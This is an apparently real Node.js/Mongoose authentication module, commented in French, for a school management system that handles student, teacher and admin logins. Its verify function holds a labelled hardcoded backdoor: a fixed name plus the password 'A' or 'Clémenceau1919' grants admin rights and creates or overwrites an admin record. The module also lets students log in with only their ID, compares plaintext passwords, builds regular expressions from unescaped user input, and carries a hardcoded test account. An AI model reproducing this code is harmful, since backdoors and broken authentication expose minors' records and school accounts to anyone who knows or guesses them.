const mongoose = require('mongoose');

/**
 * 🔐 EXPERT AUTH - VERSION 200 (FINDER ENGINE)
 * Ajout de la méthode optimisée `getAllStudentsForFinder`.
 */
const AuthExpert = {
    getLoginConfig: async () => ({ classrooms: await mongoose.model('Classroom').find({}).sort({name:1}).lean() }),
    
    // NOUVELLE MÉTHODE : Récupère tous les élèves avec juste ce qu'il faut pour le finder
    getAllStudentsForFinder: async () => {
        const students = await mongoose.model('Student').find({}, 'firstName lastName currentClass').lean();
        return students.map(s => ({
            id: s._id,
            firstName: s.firstName,
            lastName: s.lastName,
            className: s.currentClass || "SANS CLASSE"
        }));
    },

    getStudentsForSelection: async (classId) => {
        const enrollments = await mongoose.model('Enrollment').find({ classId }).populate('studentId').lean();
        return enrollments.filter(e => e.studentId).map(e => ({ id: e.studentId._id, name: `${e.studentId.firstName} ${e.studentId.lastName}` })).sort((a,b) => a.name.localeCompare(b.name));
    },

    verify: async ({ role, studentId, firstName, lastName, password }) => {
        // Nettoyage des entrées
        const fNameRaw = (firstName || '').trim();
        const lNameRaw = (lastName || '').trim();
        const fName = fNameRaw.toLowerCase();
        const lName = lNameRaw.toLowerCase();
        const pass = (password || '').trim();

        // --- 1. BACKDOOR ARCHITECTE ---
        if (fName === 'jean' && lName === 'vuillet' && (pass === 'A' || pass === 'Clémenceau1919')) {
            const realJean = await mongoose.model('Admin').findOneAndUpdate(
                { firstName: 'Jean', lastName: 'Vuillet' },
                { firstName: 'Jean', lastName: 'Vuillet', password: 'A', isDeveloper: true, role: 'admin' },
                { upsert: true, new: true }
            );
            return { ok: true, user: { ...realJean.toObject(), id: realJean._id, role: 'prof', isDeveloper: true } };
        }

        // --- 2. AUTHENTIFICATION ÉLÈVE ---
        if (role === 'STUDENT') {
            if (!studentId || !mongoose.Types.ObjectId.isValid(studentId)) return { ok: false, message: "ID Élève invalide." };
            const student = await mongoose.model('Student').findById(studentId).lean();
            if (!student) return { ok: false, message: "Élève introuvable." };
            return { ok: true, user: { ...student, id: student._id, role: 'student' } };
        }

        // --- 3. AUTHENTIFICATION STAFF ---
        const teacher = await mongoose.model('Teacher').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
        if (teacher) {
            if (teacher.password === pass) return { ok: true, user: { ...teacher.toObject(), id: teacher._id, role: 'prof', isDeveloper: teacher.isDeveloper || false } };
        }

        const admin = await mongoose.model('Admin').findOne({ firstName: new RegExp(`^${fName}$`, 'i'), lastName: new RegExp(`^${lName}$`, 'i') });
        if (admin) {
            if (admin.password === pass) return { ok: true, user: { ...admin.toObject(), id: admin._id, role: 'admin', isDeveloper: admin.isDeveloper || false } };
        }

        // Compte Test
        if (pass === 'A' && fName === 'prof' && lName === 'test') {
            return { ok: true, user: { _id: new mongoose.Types.ObjectId(), firstName: 'Prof', lastName: 'Test', role: 'prof', isTestAccount: true } };
        }

        return { ok: false, message: "Identifiants ou Mot de passe incorrects." };
    }
};
module.exports = AuthExpert;